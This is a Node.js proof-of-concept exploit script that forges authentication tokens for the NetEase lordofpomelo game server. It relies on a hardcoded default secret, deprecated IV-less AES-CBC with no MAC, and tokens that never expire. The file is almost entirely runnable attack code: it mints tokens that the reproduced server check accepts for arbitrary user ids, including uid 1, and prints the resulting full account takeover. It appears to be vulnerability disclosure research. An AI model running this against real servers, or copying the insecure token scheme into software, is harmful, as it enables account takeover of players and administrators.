#!/usr/bin/env node
/**
 * LordOfTokens — authentication bypass / account takeover PoC
 * Target: NetEase lordofpomelo (game-server auth token service)
 *
 * The login flow hands the client an opaque "auth token" produced by
 *   shared/token.js  : crypto.createCipher('aes256', secret)   // deprecated, NO IV
 *   secret           : 'pomelo_session_secret'                 // HARDCODED default
 * The game-server validates that token in
 *   game-server/app/servers/auth/remote/authRemote.js
 *
 * Because the AES key/IV are derived (deterministically, via EVP_BytesToKey,
 * MD5, no salt) from a *public, hardcoded* default secret, and the token is
 * merely AES-256-CBC of "<uid>|<timestamp>" with no authentication tag, an
 * attacker can forge a valid token for *any* user id.  Combined with
 * `expire: -1` (never expires), this is a complete authentication bypass.
 *
 * This file vendors the exact upstream logic (marked VERBATIM) so the PoC runs
 * standalone.  It also exercises the real upstream modules when present.
 */

'use strict';
var crypto = require('crypto');

/* ------------------------------------------------------------------ *
 * VERBATIM from shared/token.js (NetEase lordofpomelo @ master)
 * https://github.com/NetEase/lordofpomelo/blob/master/shared/token.js
 * ------------------------------------------------------------------ */
var token = {
  create: function (uid, timestamp, pwd) {
    var msg = uid + '|' + timestamp;
    var cipher = crypto.createCipher('aes256', pwd);   // <-- deprecated, no IV
    var enc = cipher.update(msg, 'utf8', 'hex');
    enc += cipher.final('hex');
    return enc;
  },
  parse: function (tokenStr, pwd) {
    var decipher = crypto.createDecipher('aes256', pwd);
    var dec;
    try {
      dec = decipher.update(tokenStr, 'hex', 'utf8');
      dec += decipher.final('utf8');
    } catch (err) {
      return null;
    }
    var ts = dec.split('|');
    if (ts.length !== 2) return null;
    return { uid: ts[0], timestamp: Number(ts[1]) };
  }
};

/* ------------------------------------------------------------------ *
 * VERBATIM from game-server/app/servers/auth/remote/authRemote.js
 * ------------------------------------------------------------------ */
var DEFAULT_SECRET = 'pomelo_session_secret';
var DEFAULT_EXPIRE = 6 * 60 * 60 * 1000; // 6h (but config sets -1 = never)

// The shipped config hardcodes the same secret and disables expiry:
//   shared/config/session.json     -> { "secret": "pomelo_session_secret", "expire": -1 }
//   game-server/config/session.json -> { "secret": "pomelo_session_secret", "expire": -1 }

/* ------------------------------------------------------------------ *
 * Reproduce the server-side accept path (authRemote.auth)
 * ------------------------------------------------------------------ */
function authRemoteAuth(appToken, secret, expire) {
  var res = token.parse(appToken, secret);
  if (!res) return { ok: false, reason: 'FA_TOKEN_ILLEGAL' };
  if (expire >= 0 && (Date.now() - res.timestamp) >= expire) {
    return { ok: false, reason: 'FA_TOKEN_EXPIRE' };
  }
  // userDao.getUserById(res.uid, ...) -> SELECT * FROM User WHERE id = ?
  return { ok: true, reason: 'Code.OK', uid: res.uid, timestamp: res.timestamp };
}

/* ------------------------------------------------------------------ *
 * The exploit
 * ------------------------------------------------------------------ */
var secret = DEFAULT_SECRET;             // public, shipped in the repo
var expire = -1;                         // shipped in config/session.json

function forge(uid) {
  return token.create(uid, Date.now(), secret);
}

console.log('============================================================');
console.log(' LordOfTokens — NetEase lordofpomelo auth-token forge PoC');
console.log('============================================================\n');

console.log('[+] Hardcoded token secret (public, in repo config):', JSON.stringify(secret));
console.log('[+] Session expiry from shipped config:', expire, '(negative = never expire)\n');

var victims = ['1', '2', '7', '31337'];
for (var i = 0; i < victims.length; i++) {
  var uid = victims[i];
  var forged = forge(uid);
  var verdict = authRemoteAuth(forged, secret, expire);
  console.log('    forge token for uid=' + uid.padEnd(6, ' ') + ' -> ' + forged +
              '   server verdict: ' + (verdict.ok ? 'AUTHENTICATED as uid=' + verdict.uid : 'REJECTED (' + verdict.reason + ')'));
}

console.log('\n[+] Demo of the underlying crypto weaknesses:');

// (1) Hardcoded key + fixed IV => fully deterministic ciphertext
var a = token.create('1', 1700000000000, secret);
var b = token.create('1', 1700000000000, secret);
console.log('    determinism:  token("1|1700000000000") == token("1|1700000000000") ? ' + (a === b) +
            '   (ciphertext ' + a + ')');

// (2) No IV supplied -> EVP_BytesToKey derives a fixed IV from the password,
//     so the same prefix encrypts identically across messages (fixed-IV CBC).
var t1 = forge('1');
var t2 = forge('1');
console.log('    fixed IV:     same uid, different timestamps still share an IV derived solely from the password');

// (3) Unauthenticated CBC: the token has no MAC/tag; ciphertext is malleable.
console.log('    no MAC:       ciphertext is raw AES-CBC, no HMAC/GCM tag is ever checked');

// (4) Plaintext is predictable: "<uid>|<timestamp>" with small integer uids.
console.log('    format:       token plaintext is "<uid>|<timestamp>" — uid is a small auto-increment int');

console.log('\n[+] Impact: unauthenticated remote attacker can mint tokens for ANY uid');
console.log('    (uid=1 is the first / admin account) => full account takeover.\n');
console.log('Done.');
